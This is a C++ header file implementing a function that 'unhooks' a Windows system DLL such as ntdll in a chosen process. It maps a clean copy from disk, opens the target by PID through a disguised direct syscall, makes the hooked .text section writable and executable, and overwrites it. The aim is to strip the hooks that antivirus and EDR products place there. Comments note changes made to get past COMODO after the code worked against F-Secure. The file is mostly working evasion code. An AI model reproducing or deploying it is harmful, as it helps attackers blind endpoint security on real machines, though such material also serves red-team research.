#pragma once

#include <Windows.h>
#include <psapi.h>
//#include "Structs.h"
#include "Syscalls.h"
#include "stdio.h"

//BRS
#include "sysc_sw1.h"
#include "string"

// Library function prototypes
// ------------------------------------------------------------------------

typedef VOID(NTAPI* _RtlInitUnicodeString)(
	PUNICODE_STRING DestinationString,
	PCWSTR SourceString
	);

std::wstring s2ws(const std::string& s)
{
	int len;
	int slength = (int)s.length() + 1;
	len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
	wchar_t* buf = new wchar_t[len];
	MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
	std::wstring r(buf);
	delete[] buf;
	return r;
}

// Overwrite .text section of hooked Ntdll using untainted Ntdll from disk
// ------------------------------------------------------------------------

BOOL section_remap(int processId, std::string dllToFix) {
	Sleep(2000);
	printf("[%d]\n", __LINE__);
	// Dynamically resolve the functions from Ntdll
	//BRS: only used for getting string
	HMODULE moduleHandle = GetModuleHandleA("ntdll.dll");
	printf("Handle mod: %p\n", moduleHandle);
	printf("[%d]\n", __LINE__);
	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(moduleHandle, "RtlInitUnicodeString");
	printf("[%d]\n", __LINE__);
	if (RtlInitUnicodeString == NULL)
	{
		printf("%s",RtlInitUnicodeString);
		printf("[%d]\n", __LINE__);
		return FALSE;
	}

	printf("[%d]\n", __LINE__);
	// Init some important stuff

	//BRS, was:
	//LPCWSTR ntdllPathW = L"\\??\\C:\\Windows\\System32\\kernel32.dll";
	//std::wstring wDllToFix((std::string)dllToFix);
	std::wstring wDllToFix = s2ws(dllToFix);
	std::wstring wFullDllName = L"\\??\\C:\\Windows\\System32\\" + wDllToFix + L".dll";
	LPCWSTR ntdllPathW = wFullDllName.c_str();

	UNICODE_STRING ntdllPathU;
	OBJECT_ATTRIBUTES objectAttributes = {};
	_IO_STATUS_BLOCK ioStatusBlock = {};
	HANDLE handleNtdllDisk = NULL;
	HANDLE handleNtdllSection = NULL;
	LPVOID unhookedNtdllBaseAddress = NULL;
	LPVOID hookedNtdllBaseAddress = NULL;
	HMODULE Ntdll = NULL;
	MODULEINFO moduleInfo = {};
	PIMAGE_DOS_HEADER dosHeader = 0;
	PIMAGE_NT_HEADERS ntHeader = 0;
	PIMAGE_SECTION_HEADER sectionHeader = 0;
	LPSTR sectionName;
	ULONG oldProtection;
	LPVOID hookedNtdllTextStartAddress = NULL;
	LPVOID unhookedNtdllTextStartAddress = NULL;
	SIZE_T textSectionSize;
	NTSTATUS status;
	SIZE_T size = 0;
	LPVOID lpBaseAddress;
	SIZE_T uSize;

	// Convert Ntdll path to unicode
	RtlInitUnicodeString(&ntdllPathU, ntdllPathW);

	Sleep(50);
	// Get a handle to untainted Ntdll on disk
	objectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
	objectAttributes.ObjectName = &ntdllPathU;
	status = NtCreateFile(&handleNtdllDisk, FILE_READ_ATTRIBUTES | GENERIC_READ | SYNCHRONIZE, &objectAttributes, &ioStatusBlock, NULL, 0, FILE_SHARE_READ, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if (status != STATUS_SUCCESS) {
		printf("[-] NtCreateFile error: %X\n", status);
		//OutputDebugStringA("[DBG] Syscalls resolved!");
		printf("[%d]\n", __LINE__);
		return FALSE;
	}
	printf("[%d]\n", __LINE__);

	Sleep(50);
	// Create read-only section object for on-disk Ntdll
	status = NtCreateSection(&handleNtdllSection, STANDARD_RIGHTS_REQUIRED | SECTION_MAP_READ | SECTION_QUERY, NULL, NULL, PAGE_READONLY, SEC_IMAGE, handleNtdllDisk);
	if (status != STATUS_SUCCESS) {
		printf("[-] NtCreateSection error: %X\n", status);
		printf("[%d]\n", __LINE__);
		return FALSE;
	}
	printf("%-20s 0x%p\n", "Section Handle address:", handleNtdllSection);
	printf("[%d]\n", __LINE__);

	Sleep(50);
	//BRS: added, set process by id:
	//int processId = 4640;
	
	//Aanpassing vanwege COMODO: syscall voor openprocess, werkte wel voor f-sec
	//HANDLE processHandle = OpenProcess(SYNCHRONIZE| STANDARD_RIGHTS_REQUIRED | 0xFFFF, FALSE, processId);

	//Open process using syscalls
	HANDLE processHandle = NULL;
	printf("[%d]\n", __LINE__);
	OBJECT_ATTRIBUTES ObjectAttributes;
	printf("[%d]\n", __LINE__);
	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
	CLIENT_ID uPidTarget = { 0 };
	uPidTarget.UniqueProcess = (HANDLE)processId;
	uPidTarget.UniqueThread = (HANDLE)0;
	printf("[%d]\n", __LINE__);
	NTSTATUS statusOpenTarget = ZOP10(&processHandle, SYNCHRONIZE | STANDARD_RIGHTS_REQUIRED | 0xFFFF, &ObjectAttributes, &uPidTarget);
	printf("[%d]\n", __LINE__);
	printf("%d", processHandle);
	printf("[%d]\n", __LINE__);

	
	// 
	// Map read-only view of section in local process
	status = NtMapViewOfSection(handleNtdllSection, NtCurrentProcess(), &unhookedNtdllBaseAddress, 0, 0, 0, &size, ViewShare, 0, PAGE_READONLY);
	if (status != STATUS_IMAGE_NOT_AT_BASE) {
		printf("[-] NtMapViewOfSection error: %X\n", status);
		printf("[%d]\n", __LINE__);
		return FALSE;
	}
	printf("%-20s 0x%p\n", "Untainted Ntdll base address: ", unhookedNtdllBaseAddress);

	Sleep(50);
	// Get handle to loaded Ntdll

	/*
    //BRS:
	Ntdll = moduleHandle;
	//WAS: Ntdll = GetModuleHandleA("ntdll.dll");
	*/
	Ntdll = GetModuleHandleA((LPCSTR)(dllToFix+".dll").c_str());

	Sleep(50);
	// Get MODULEINFO struct
	if (GetModuleInformation(NtCurrentProcess(), Ntdll, &moduleInfo, sizeof(moduleInfo)) == 0) {
		printf("[-] GetModuleInformation error: %d\n", GetLastError());
		printf("[%d]\n", __LINE__);
		return FALSE;
	}

	Sleep(50);
	// Get base address of hooked Ntdll from MODULEINFO struct
	hookedNtdllBaseAddress = (LPVOID)moduleInfo.lpBaseOfDll;
	printf("%-20s 0x%p\n", "Tainted dll base address: ", hookedNtdllBaseAddress);

	// Get DOS header
	dosHeader = (PIMAGE_DOS_HEADER)hookedNtdllBaseAddress;

	// Get Nt Header
	ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)hookedNtdllBaseAddress + dosHeader->e_lfanew);

	Sleep(50);
	// Loop through all the PE sections until we find .text section
	for (SIZE_T i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
		// Get PE section header
		sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(ntHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		// Get section name
		sectionName = (LPSTR)sectionHeader->Name;

		// We found .text section!
		if (!strcmp(sectionName, ".text")) {
			Sleep(50);
			printf("Found .text section\n");

			// Get start address of hooked .text section
			hookedNtdllTextStartAddress = (LPVOID)((DWORD_PTR)hookedNtdllBaseAddress + (DWORD_PTR)sectionHeader->VirtualAddress);

			// Get start address of unhooked .text section
			unhookedNtdllTextStartAddress = (LPVOID)((DWORD_PTR)unhookedNtdllBaseAddress + (DWORD_PTR)sectionHeader->VirtualAddress);
			//BRS:
			//unhookedNtdllTextStartAddress = (LPVOID)((DWORD_PTR)0x0000029FC70B0000 + (DWORD_PTR)sectionHeader->VirtualAddress);

			// Get size of .text section
			textSectionSize = sectionHeader->Misc.VirtualSize;

			printf("%-20s 0x%p\n", "Tainted dll .text VA: ", hookedNtdllTextStartAddress);
			printf("%-20s 0x%p\n", "Untainted dll .text VA: ", unhookedNtdllTextStartAddress);
			printf(".text section size: %d\n", textSectionSize);

			Sleep(50);
			// Change original page protection of hooked Ntdll to RWX
			lpBaseAddress = hookedNtdllTextStartAddress;
			uSize = textSectionSize;
			//BRS:  processHandle was NtCurrentProcess() 
			status = NtProtectVirtualMemory(processHandle, &lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			if (status != STATUS_SUCCESS) {
				printf("[-] NtProtectVirtualMemory1 error: %X\n", status);
				return FALSE;
			}
			// Copy .text section of unhooked Ntdll into hooked Ntdll .text section
			//BRS: commented
			//memcpy(hookedNtdllTextStartAddress, unhookedNtdllTextStartAddress, textSectionSize);
			//BRS added:
			//BRS:  processHandle was NtCurrentProcess() (3x)
			//REWRITE, commented:
			//WriteProcessMemory(processHandle, hookedNtdllTextStartAddress, unhookedNtdllTextStartAddress, textSectionSize, &written);

			//REWRITE, added:
//			WriteProcessMemory(processHandle, hookedNtdllTextStartAddress, unhookedNtdllTextStartAddress, textSectionSize, &written);
//			WriteProcessMemory(hProcess, lpBaseAddress, dllPath, strlen(dllPath), nullptr);
			
			//LPVOID lpAllocationStart = nullptr;
			//SIZE_T szAllocationSize = textSectionSize;
			//NtAllocateVirtualMemory(processHandle, &lpAllocationStart, 0, (PULONG)&szAllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
			LPVOID lpAllocationStart = hookedNtdllTextStartAddress;
			SIZE_T written;
			NtWriteVirtualMemory(processHandle, lpAllocationStart, (PVOID)unhookedNtdllTextStartAddress, textSectionSize, &written);
			printf("Written: %zu\n", written);

			Sleep(10);
			// Revert back to original page protections of now refreshed Ntdll
			//BRS:  processHandle was NtCurrentProcess() (3x)
			status = NtProtectVirtualMemory(processHandle, &lpBaseAddress, &uSize, oldProtection, &oldProtection);
			if (status != STATUS_SUCCESS) {
				printf("[-] NtProtectVirtualMemory2 error: %X\n", status);
				return FALSE;
			}

			break;
		}
	}

	// Cleanup
	// Unmap the local section view
	Sleep(50);
	status = NtUnmapViewOfSection(NtCurrentProcess(), unhookedNtdllBaseAddress);
	if (status != STATUS_SUCCESS) {
		printf("[-] NtUnmapViewOfSection error: %X\n", status);
		printf("[%d]\n", __LINE__);
		return FALSE;
	}
	NtClose(handleNtdllSection);
	NtClose(handleNtdllDisk);
	//BRS added:
	CloseHandle(processHandle);
	printf("[%d]\n", __LINE__);
	return TRUE;
}